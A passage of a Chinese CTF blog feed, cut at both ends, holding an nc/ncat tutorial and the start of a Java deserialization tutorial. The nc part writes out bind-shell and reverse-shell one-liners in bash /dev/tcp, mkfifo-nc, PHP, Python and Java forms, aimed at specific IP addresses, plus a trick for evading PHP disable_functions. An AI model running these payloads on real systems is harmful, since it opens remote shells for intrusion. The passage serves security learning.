data-src="/../images/202301310254143.jpg"                      alt="image-20220926004654073"                ><figcaption>image-20220926004654073</figcaption></figure></p><blockquote><p>只是简单的文字交互，相当于聊天工具，对数据编码没有要求，但无法执行系统命令</p></blockquote><h3 id="命令交互"><a href="#命令交互" class="headerlink" title="命令交互"></a>命令交互</h3><p><code>-e</code>：将传入的信息以命令执行</p><p>将<code>/bin/bash</code>通过 3344 端口来监听，将收到的信息都发送到<code>/bin/bash</code></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -l -e /bin/bash 3344</span><br></pre></td></tr></table></figure></div><blockquote><p><code>/bin/bash</code>是shell解释器，根据目标机器，也可以使用<code>/bin/sh</code>或<code>/bin/zsh</code></p><p>访问端可以通过nc该系统的2333端口，输入端指令会传入该系统的&#x2F;bin&#x2F;bash 执行成功后会返回信息，类似于ssh操作连接来该系统一样</p></blockquote><h3 id="持久监听"><a href="#持久监听" class="headerlink" title="持久监听"></a>持久监听</h3><p><code>-k</code>: 客户端断掉连接时，服务端依然保持运行<br><code>-v</code>：现实指令执行过程细节</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvk -e  /bin/bash 2333</span><br></pre></td></tr></table></figure></div><blockquote><p>客户端使用<code>CTRL + c</code>或<code>CTRL + d</code>断开连接的时候，监听端的 ncat 依然在运行，这样方便客户端下次直接 nc 连进来</p></blockquote><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><h4 id="上传文件到远程"><a href="#上传文件到远程" class="headerlink" title="上传文件到远程"></a>上传文件到远程</h4><p>root@Sloth远程服务器运行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -l 3344 &gt; hello.txt</span><br></pre></td></tr></table></figure></div><p>macOS 本地运行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 124.223.207.184 3344 &lt; hello.txt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255144.jpg"                      alt="image-20220926011113841"                ><figcaption>image-20220926011113841</figcaption></figure></p><blockquote><p>此时会将 macOS 的文件传输到远程的 CentOS 服务器上，传输完成后，两个 ncat 会话都将终止。</p></blockquote><h4 id="从远程下载文件"><a href="#从远程下载文件" class="headerlink" title="从远程下载文件"></a>从远程下载文件</h4><p>root@Sloth远程服务器运行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -l 3344 &lt; hello.txt </span><br></pre></td></tr></table></figure></div><p>macOS 本地运行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 124.223.207.184 3344 &gt; hello.txt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255056.jpg"                      alt="image-20220926011518092"                ><figcaption>image-20220926011518092</figcaption></figure></p><blockquote><p>这里文件传输完成后不会显示任何内容，并且两个 Ncat 实例将继续工作(但不能文字和命令交互)</p></blockquote><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>ncat 不支持端口范围扫描，但是原始的 nc (mac上可以用brew装netcat)可以扫描端口</p><ul><li><h4 id="范围扫描"><a href="#范围扫描" class="headerlink" title="范围扫描"></a>范围扫描</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255349.jpg"                      alt="image-20220926012145161"                ><figcaption>image-20220926012145161</figcaption></figure></p><blockquote><p><code>-n</code>: 直接使用ip地址，而不通过域名服务器<br><code>-z</code>: 使用0输入&#x2F;输出模式%，只在扫描通信端口时使用</p></blockquote></li><li><h4 id="单个扫描"><a href="#单个扫描" class="headerlink" title="单个扫描"></a>单个扫描</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255336.jpg"                      alt="image-20220926012300304"                ><figcaption>image-20220926012300304</figcaption></figure></p></li></ul><h3 id="vps-nc本机失败可能原因"><a href="#vps-nc本机失败可能原因" class="headerlink" title="vps nc本机失败可能原因"></a>vps nc本机失败可能原因</h3><ul><li><p>本机未监听，tcp连接要让本机先在对应端口监听才能建立，而udp不用，这种情况下一般回显</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ncat: Connection refused.</span><br></pre></td></tr></table></figure></div><p>如果使用原始nc，则表现为没有回显，命令直接结束</p></li><li><p>端口未放行:一般回显表现为</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ncat: TIMEOUT.</span><br><span class="line">或</span><br><span class="line">Ncat: Connection timed out.</span><br></pre></td></tr></table></figure></div><p>如果使用原始nc则是等待较长时间，命令结束，没有回显</p></li><li><p>使用的本机ip不是公网ip</p></li><li><p>经测试，可能是因为端口未放行，这可能需要配置路由器的防火墙</p></li></ul><h3 id="常见options"><a href="#常见options" class="headerlink" title="常见options"></a>常见options</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l 启动监听</span><br><span class="line">-p&lt;端口号&gt; 表示指定端口</span><br><span class="line">-v 显示指令执行过程</span><br><span class="line">-u udp连接</span><br><span class="line">-n 直接使用ip地址，不用域名解析</span><br><span class="line">-w&lt;超时秒数&gt;   设置等待连线的时间</span><br><span class="line">-z  使用0输入/输出模式，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure></div><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>vps监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端</p><h3 id="内网弹shell"><a href="#内网弹shell" class="headerlink" title="内网弹shell"></a>内网弹shell</h3><p>ncat的-e 经过简单调整，可以让vps与内网机器进行命令交互</p><p>root@Sloth先监听</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvp 3344</span><br></pre></td></tr></table></figure></div><p>内网的 macOS 运行</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -w 10 -e /bin/bash 124.221.124.106 3344</span><br></pre></td></tr></table></figure></div><p>Linux</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  124.221.124.106 3344 -e /bin/sh</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255233.jpg"                      alt="image-20220926013811064"                ><figcaption>image-20220926013811064</figcaption></figure></p><blockquote><p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../Pictures/%60nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%60/e6c9d24egy1h6kgeanctvj21r80l6tiz.jpg"                      alt="image-20220927000457356"                ><figcaption>image-20220927000457356</figcaption></figure></p><ul><li><code>rm /tmp/f</code> 删除命令</li><li><code>mkfifo /tmp/f;</code> 在tmp目录下写fifo文件f</li><li><code>/bin/bash -i 2&gt;&amp;1</code> 将&#x2F;bin&#x2F;bash 的标准错误重定向到标准输出</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>将nc监听到的输入 输入到fifo</li><li><code>cat /tmp/f</code> 将执行结果回显</li></ul></blockquote><h3 id="bash弹shell"><a href="#bash弹shell" class="headerlink" title="bash弹shell"></a>bash弹shell</h3><p>这也是常用的反弹shell payload</p><p>⚠️注意：java命令执行时，会根据空格分割参数。因此最好不要直接传类似下面第二条这种</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&quot;   #适用sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">适配java的</span></span><br><span class="line">String[] s = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#x27;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&#x27;&quot;&#125;;</span><br><span class="line">Runtime.getRuntime().exec(s);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255967.jpg"                      alt="image-20220927204310944"                ><figcaption>image-20220927204310944</figcaption></figure></p><table><thead><tr><th>命令</th><th>参数解释</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个 bash 交互环境</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面结合然后一起重定向给后者</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;10.211.55.4&#x2F;2333</td><td>打开<code>/dev/tcp</code>这个文件就类似于发出了一个socket调用，建立一个socket连接,后面跟目标ip和目标端口</td></tr><tr><td>0&gt;&amp;1</td><td>使得攻击方可以看到输入到命令以及执行结果</td></tr></tbody></table><blockquote><ul><li><p>其实<code>/dev/tcp</code>在根目录下并不存在，之所以能在命令中使用，是因为bash源码对其做了相关预定义</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255199.jpg"                      alt="image-20220926171832801"                ><figcaption>image-20220926171832801</figcaption></figure></p></li><li><p>如果攻击目标是mac os系统，使用内网弹shell的payload可以成功，bash弹shell的payload可能失败</p><ul><li><p>原因：现在的mac都已经使用zsh作为默认shell，而zsh并没有对<code>/dev/tcp</code>做相关处理，执行payload会回显</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsh: no such file or directory: /proc/net/tcp/110.42.158.239/2333</span><br></pre></td></tr></table></figure></div></li><li><p>如果要使用bash弹shell要先切换当前使用shell，可以<code>sudo su</code>输入当前用户密码切换到root用户，默认使用sh</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310256550.jpg"                      alt="image-20220926172537373"                ><figcaption>image-20220926172537373</figcaption></figure></p></li><li><p>或者更改shell为bash</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/bash</span><br></pre></td></tr></table></figure></div></li></ul></li></ul></blockquote><h4 id="其他形式"><a href="#其他形式" class="headerlink" title="其他形式"></a>其他形式</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 124.221.124.106 3344 &gt; /tmp/f</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>第一条命令 建立与x.x.x.x:4444的tcp连接，并将标准输入输出作为device 5的标准输入输出</li><li>第二条cat &lt;&amp;5 获取device5的输入; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中</li></ul></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310256792.jpg"                      alt="image-20220926224353002"                ><figcaption>image-20220926224353002</figcaption></figure></p><h3 id="基于编程语言的反弹shell"><a href="#基于编程语言的反弹shell" class="headerlink" title="基于编程语言的反弹shell"></a>基于编程语言的反弹shell</h3><p>1、基于PHP的反弹</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure></div><p>2、基于python反弹shell</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;ip&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure></div><blockquote><p>使用socket建立起tcp连接</p><p>os.dup2() 方法用于将一个文件描述符 fd 复制到另一个 fd2，这里将标准输入、标准输出、标准错误都集成到当前socket的文件描述符上,然后再产生一个 bash 交互环境</p></blockquote><p>2、受到disable_functions影响，导致fsockopen或者exec不可用。<br>当监听端收不到连接就是fsockopen被禁用，又或者收到连接后又立马断开则是exec被禁用<br>解决方法：<br>php在命令行中执行时修改 php.ini 是立即生效的，因此我们直接重命名php.ini文件即可:</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/php.ini /etc/php.ini.bak</span><br></pre></td></tr></table></figure></div><p>当然，文件位置并不是一定在这里。可以把常用位置都试一遍。当然了，实战中可千万不要这么搞，业务烂了就呜呜呜了。</p><p>参考博客:</p><ol><li><a class="link"   href="https://blog.csdn.net/haoge1998/article/details/124259580?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa" >反弹shell原理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://www.sqlsec.com/2019/10/nc.html" >nc命令教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> shell </tag>
            
            <tag> nc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2022/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p><code>Java</code>相对<code>PHP</code>序列化更深入的地方在于，其提供了更加高级、灵活地方法 <code>writeObject</code> ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 <code>readObject</code> 进行读取。</p><p><code>Java</code>设计 <code>readObject</code> 的思路和<code>PHP</code>的 <code>__wakeup</code> 不同点在于： <code>readObject</code> 倾向于解决”反序列化时如何还原一个完整对象”这个问题，而<code>PHP</code>的 <code>__wakeup</code> 更倾向于解决“反序列化后如何初始化这个对象”的问题。</p><p>在Java中实现对象反序列化非常简单，实现<code>java.io.Serializable(内部序列化)</code>或<code>java.io.Externalizable(外部序列化)</code>接口即可被序列化，其中<code>java.io.Externalizable</code>接口只是实现了<code>java.io.Serializable</code>接口。</p><p>反序列化类对象时有如下限制：</p><ol><li>被反序列化的类必须存在。</li><li><code>serialVersionUID</code>值必须一致。</li></ol><h2 id="ObjectInputStream、ObjectOutputStream"><a href="#ObjectInputStream、ObjectOutputStream" class="headerlink" title="ObjectInputStream、ObjectOutputStream"></a>ObjectInputStream、ObjectOutputStream</h2><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p><p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化类对象。</p><p>所以，只需借助<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能了。</p><h3 id="反序列化接口"><a href="#反序列化接口" class="headerlink" title="反序列化接口"></a>反序列化接口</h3><p>java中的unserializable接口是空的，所以实现该接口不用重写什么方法</p><blockquote><ul><li><p>反序列化过程中，绕过它的父类没有实现序列化接口，那么要提高无参构造函数来重新创建对象</p></li><li><p>一个实现Serializable接口的子类也可以被序列化</p></li><li><p>实现了<strong>Serializable</strong>或者 <strong>Externalizable</strong>接口的类的对象才能被序列化为字节序列</p></li><li><p>静态成员变量是不能被序列化（序列化针对对象属性）</p></li><li><h5 id="transient-标识的对象成员变量不参与序列化"><a href="#transient-标识的对象成员变量不参与序列化" class="headerlink" title="transient 标识的对象成员变量不参与序列化"></a>transient 标识的对象成员变量不参与序列化</h5></li></ul></blockquote><h3 id="java-io-Serializable"><a href="#java-io-Serializable" class="headerlink" title="java.io.Serializable"></a>java.io.Serializable</h3><p>这是一个空的接口，某个类实现了该接口可以标识该类可以序列化，我们不需要实现<code>java.io.Serializable</code>的任何方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>实现了<code>java.io.Serializable</code>接口的类原则上都需要生产一个<code>serialVersionUID</code>常量，反序列化时如果双方的<code>serialVersionUID</code>不一致会导致<code>InvalidClassException</code> 异常，如果可序列化类未显式声明 <code>serialVersionUID</code>，则序列化运行时将基于该类的各个方面计算该类的默认 <code>serialVersionUID</code>值。</p><p><code>DeserializationTest.java</code>测试代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.serializes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/15</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省去get/set方法....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 创建DeserializationTest类，并类设置属性值</span></span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeserializationTest</span>();</span><br><span class="line">t.setUsername(<span class="string">&quot;yz&quot;</span>);</span><br><span class="line">t.setEmail(<span class="string">&quot;admin@javaweb.org&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Java对象序列化输出流对象</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化DeserializationTest类</span></span><br><span class="line">out.writeObject(t);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印DeserializationTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址</span></span><br><span class="line">System.out.println(<span class="string">&quot;DeserializationTest类序列化后的字节数组:&quot;</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用DeserializationTest类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化获取对象</span></span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">test</span> <span class="operator">=</span> (DeserializationTest) in.readObject();</span><br><span class="line">System.out.println(<span class="string">&quot;用户名:&quot;</span> + test.getUsername() + <span class="string">&quot;,邮箱:&quot;</span> + test.getEmail());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭ObjectInputStream输入流</span></span><br><span class="line">in.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>执行结果</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeserializationTest类序列化后的字节数组:[-84, -19, 0, 5, 115, 114, 0, 44, 99, 111, 109, 46, 97, 110, 98, 97, 105, 46, 115, 101, 99, 46, 115, 101, 114, 105, 97, 108, 105, 122, 101, 115, 46, 68, 101, 115, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 84, 101, 115, 116, 74, 36, 49, 16, -110, 39, 13, 76, 2, 0, 2, 76, 0, 5, 101, 109, 97, 105, 108, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 0, 8, 117, 115, 101, 114, 110, 97, 109, 101, 113, 0, 126, 0, 1, 120, 112, 116, 0, 17, 97, 100, 109, 105, 110, 64, 106, 97, 118, 97, 119, 101, 98, 46, 111, 114, 103, 116, 0, 2, 121, 122]</span><br><span class="line">用户名:yz,邮箱:admin@javaweb.org</span><br></pre></td></tr></table></figure></div><blockquote><p>核心逻辑其实就是使用<code>ObjectOutputStream</code>类的<code>writeObject</code>方法序列化<code>DeserializationTest</code>类，使用<code>ObjectInputStream</code>类的<code>readObject</code>方法反序列化<code>DeserializationTest</code>类而已。</p></blockquote><p>简化后的代码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化DeserializationTest类</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">out.writeObject(t);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化输入流数据为DeserializationTest对象</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">test</span> <span class="operator">=</span> (DeserializationTest) in.readObject();</span><br></pre></td></tr></table></figure></div><p><code>ObjectOutputStream</code>序列化类对象的主要流程是首先判断序列化的类是否重写了<code>writeObject</code>方法，如果重写了就调用序列化对象自身的<code>writeObject</code>方法序列化，序列化时会先写入类名信息，其次是写入成员变量信息(通过反射获取所有不包含被<code>transient</code>修饰的变量和值)。</p><h3 id="自定义序列化-writeObject-和反序列化-readObject"><a href="#自定义序列化-writeObject-和反序列化-readObject" class="headerlink" title="自定义序列化(writeObject)和反序列化(readObject)"></a>自定义序列化(writeObject)和反序列化(readObject)</h3><p>实现了<code>java.io.Serializable</code>接口的类，还可以定义如下方法(<code>反序列化魔术方法</code>)，这些方法将会在类序列化或反序列化过程中调用：</p><ol><li><strong><code>private void writeObject(ObjectOutputStream oos)</code>,自定义序列化。</strong></li><li><strong><code>private void readObject(ObjectInputStream ois)</code>，自定义反序列化。</strong></li><li><code>private void readObjectNoData()</code>。</li><li><code>protected Object writeReplace()</code>，写入时替换对象。</li><li><code>protected Object readResolve()</code>。</li></ol><p>序列化时可自定义的方法示例代码：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span 